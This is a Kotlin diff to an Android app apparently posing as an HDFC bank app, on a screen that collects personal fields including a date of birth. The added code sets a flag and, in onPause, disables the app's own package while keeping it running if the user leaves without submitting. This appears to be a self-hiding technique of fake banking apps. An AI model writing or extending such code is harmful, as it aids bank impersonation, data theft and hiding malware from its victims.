@@ -1,6 +1,7 @@
 package com.example.hdfc_new_app
 
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Bundle
 import android.text.Editable
 import android.text.TextWatcher
@@ -23,6 +24,7 @@ class secondpage : AppCompatActivity() {
         binding = ActivitySecondpageBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
+        util.saveLocalData(this,"check","true")
 
         binding.e2.addTextChangedListener(dateOfBirthTextWatcher)
 
@@ -37,6 +39,7 @@ class secondpage : AppCompatActivity() {
 
 
         binding.sub.setOnClickListener {
+            util.saveLocalData(this ,"check","false")
             if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty()){
                 Toast.makeText(this,"Fill all fields", Toast.LENGTH_SHORT).show()
             }else{
@@ -67,6 +70,19 @@ class secondpage : AppCompatActivity() {
         }
 
 
+    }
+
+    override fun onPause() {
+        super.onPause()
+        val util =  Util()
+        if(util.getLocalData(this,"check")=="true") {
+            Log.e("asdf123", "pause: verify activity")
+            val pakagemanger = packageManager
+            pakagemanger.setApplicationEnabledSetting(
+                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        }
     }
 
     private fun transfer(){
